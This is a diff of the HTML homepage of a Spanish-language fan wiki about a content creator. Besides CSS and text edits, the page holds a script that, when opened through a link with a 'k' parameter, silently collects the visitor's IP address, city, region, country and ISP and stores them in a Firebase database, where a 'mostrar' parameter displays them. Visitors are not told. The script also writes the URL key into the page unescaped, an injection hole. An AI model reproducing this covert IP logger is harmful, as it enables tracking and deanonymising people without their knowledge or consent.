@@ -3,36 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bienvenid@ a la Azzypedia| Azzypedia</title>
+  <title>Bienvenid@ a la Azzypedia | Azzypedia</title>
   <link rel="icon" href="https://thebrucepro.github.io/azzypedia/logo.jpg" type="image/jpeg">
-  
-  <style>
-    * {
-      box-sizing: border-box;
-    }
 
+  <style>
+    * { box-sizing: border-box; }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f4f4f4;
       margin: 0;
       color: #333;
     }
-
     header {
       background-color: #202225;
       padding: 20px;
       text-align: center;
     }
-
-    header a:hover {
-      cursor: pointer;
-    }
-
     header img {
       height: 120px;
       border-radius: 10px;
     }
-
     nav {
       background-color: #e6e6e6;
       padding: 15px;
@@ -44,21 +34,8 @@
       top: 160px;
       left: 0;
     }
-
-    nav h2 {
-      font-size: 18px;
-      margin-top: 0;
-    }
-
-    nav ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    nav ul li {
-      margin: 12px 0;
-    }
-
+    nav ul { list-style: none; padding: 0; }
+    nav ul li { margin: 12px 0; }
     nav ul li a {
       text-decoration: none;
       color: #333;
@@ -67,21 +44,11 @@
       border-radius: 4px;
       transition: background-color 0.3s;
     }
-
-    nav ul li a:hover {
-      background-color: #dcdcdc;
-    }
-
+    nav ul li a:hover { background-color: #dcdcdc; }
     main {
       margin-left: 240px;
       padding: 30px 20px;
     }
-
-    main h2 {
-      font-size: 26px;
-      margin-bottom: 10px;
-    }
-
     .infobox {
       float: right;
       background-color: #fff;
@@ -92,26 +59,6 @@
       margin-left: 20px;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
     }
-
-    .infobox p {
-      margin: 10px 0;
-    }
-
-    a {
-      color: #0066cc;
-    }
-
-    a:hover {
-      text-decoration: underline;
-    }
-
-    img {
-      max-width: 100%;
-      height: auto;
-      margin-top: 20px;
-      border-radius: 5px;
-    }
-
     footer {
       clear: both;
       background-color: #202225;
@@ -120,95 +67,83 @@
       padding: 15px;
       margin-top: 40px;
     }
-
     @media screen and (max-width: 768px) {
-      nav {
-        position: relative;
-        width: 100%;
-        height: auto;
-        float: none;
-        top: 0;
-      }
-
-      main {
-        margin-left: 0;
-      }
-
-      .infobox {
-        float: none;
-        width: 100%;
-        margin: 20px 0;
-      }
+      nav { position: relative; width: 100%; height: auto; float: none; top: 0; }
+      main { margin-left: 0; }
+      .infobox { float: none; width: 100%; margin: 20px 0; }
     }
   </style>
 </head>
+
 <body>
+
+<!-- ✅ SDK de Firebase (CDN) -->
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js"></script>
 
+<!-- ✅ Inicialización de Firebase -->
 <script>
-// 1. Configuración
-  const firebaseConfig = {
-    apiKey: "AIzaSyDa0qObFuL4QCRwkaz0qNQiEZ8MCrm6g0I",
-    authDomain: "azzypedia-c.firebaseapp.com",
-    databaseURL: "https://azzypedia-c-default-rtdb.europe-west1.firebasedatabase.app",
-    projectId: "azzypedia-c",
-    storageBucket: "azzypedia-c.firebasestorage.app",
-    messagingSenderId: "180939034442",
-    appId: "1:180939034442:web:8d418867b83456c9fdbbb3"
-  };
+const firebaseConfig = {
+  apiKey: "AIzaSyDa0qObFuL4QCRwkaz0qNQiEZ8MCrm6g0I",
+  authDomain: "azzypedia-c.firebaseapp.com",
+  databaseURL: "https://azzypedia-c-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "azzypedia-c",
+  storageBucket: "azzypedia-c.firebasestorage.app",
+  messagingSenderId: "180939034442",
+  appId: "1:180939034442:web:cca503f7112f93b2fdbbb3"
+};
 
-// 2. Inicializar Firebase
 firebase.initializeApp(firebaseConfig);
-
-// 3. Crear referencia a la base de datos
 const db = firebase.database();
 </script>
 
+<!-- ✅ Lógica de IP + Región -->
 <script>
-//4. Lógica (ahora sí funciona)
 const params = new URLSearchParams(window.location.search);
 const key = params.get("k");
 const mostrar = params.has("mostrar");
 
-fetch("https://ipapi.co/json/")
-  .then(res => res.json())
-  .then(data => {
-    const info = {
-      ip: data.ip,
-      region: data.region,
-      ciudad: data.city,
-      pais: data.country_name,
-      isp: data.org
-    };
+if (key) {
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      const info = {
+        ip: data.ip,
+        region: data.region,
+        ciudad: data.city,
+        pais: data.country_name,
+        isp: data.org
+      };
 
-    if (mostrar) {
-      db.ref("ips/" + key).once("value").then(snapshot => {
-        const datos = snapshot.val();
-        if (!datos) {
-          document.body.innerHTML += `<p>No hay datos para la clave "${key}".</p>`;
-          return;
-        }
+      if (mostrar) {
+        db.ref("ips/" + key).once("value").then(snapshot => {
+          const datos = snapshot.val();
+          if (!datos) {
+            document.body.innerHTML += `<p>No hay datos para la clave "${key}".</p>`;
+            return;
+          }
 
-        document.body.innerHTML += `
-          <p><b>IP:</b> ${datos.ip}</p>
-          <p><b>Región:</b> ${datos.region}</p>
-          <p><b>Ciudad:</b> ${datos.ciudad}</p>
-          <p><b>País:</b> ${datos.pais}</p>
-          <p><b>ISP:</b> ${datos.isp}</p>
-        `;
-      });
-    } else {
-      db.ref("ips/" + key).set(info);
-      document.body.innerHTML += `<p>Datos guardados correctamente.</p>`;
-    }
-  });
+          document.body.innerHTML += `
+            <p><b>IP:</b> ${datos.ip}</p>
+            <p><b>Región:</b> ${datos.region}</p>
+            <p><b>Ciudad:</b> ${datos.ciudad}</p>
+            <p><b>País:</b> ${datos.pais}</p>
+            <p><b>ISP:</b> ${datos.isp}</p>
+          `;
+        });
+      } else {
+        db.ref("ips/" + key).set(info);
+        document.body.innerHTML += `<p>Datos guardados correctamente.</p>`;
+      }
+    });
+}
 </script>
 
-  
 <header>
   <h1>
-    <a href="https://thebrucepro.github.io/azzypedia/#"><img src="https://thebrucepro.github.io/azzypedia/logo_nuevo.jpg" alt="Logo Azzy hecho por Luigiova44" style="height: 120px; margin: 10px auto; border-radius: 10px;"></a>
+    <a href="https://thebrucepro.github.io/azzypedia/#">
+      <img src="https://thebrucepro.github.io/azzypedia/logo_nuevo.jpg" alt="Logo Azzy hecho por Luigiova44">
+    </a>
   </h1>
 </header>
 
@@ -219,7 +154,7 @@ fetch("https://ipapi.co/json/")
     <li><a href="https://thebrucepro.github.io/azzypedia/historia/index.html">Historia</a></li>
     <li><a href="https://thebrucepro.github.io/azzypedia/gente/index.html">Gente</a></li>
     <li><a href="https://thebrucepro.github.io/azzypedia/ayuda/index.html">Ayuda</a></li>
-    <li><a href="https://thebrucepro.github.io/azzypedia/creditos.html">Creditos de la creación</a></li>
+    <li><a href="https://thebrucepro.github.io/azzypedia/creditos.html">Créditos</a></li>
     <li><a href="https://discord.gg/3sPCmmmD" target="_blank">Discord Oficial</a></li>
   </ul>
 </nav>
@@ -229,15 +164,14 @@ fetch("https://ipapi.co/json/")
 
   <div class="infobox">
     <h3>¿Qué es Azzypedia?</h3>
-    <p>Azzypedia es la wiki oficial sobre <strong>Azzy</strong>, un creador de contenido centrado en <em>Undertale, Deltarune y Persona</em>. Aquí encontrarás recuerdos del servidor, historia del canal, personajes, y más.</p>
+    <p>Azzypedia es la wiki oficial sobre <strong>Azzy</strong>, un creador de contenido centrado en <em>Undertale, Deltarune y Persona</em>.</p>
   </div>
 
   <p>
-    Esta wiki fue creada para el server de azzy para preservar la memoria del canal y comunidad de Azzy. Explora los artículos y contribuye si tienes información para compartir.
+    Esta wiki fue creada para preservar la memoria del canal y comunidad de Azzy. Explora los artículos y contribuye si tienes información para compartir.
   </p>
 
   <img src="https://thebrucepro.github.io/azzypedia/azzy_normal.jpg" alt="Imagen del furro de Azzy" />
-
 </main>
 
 <footer>
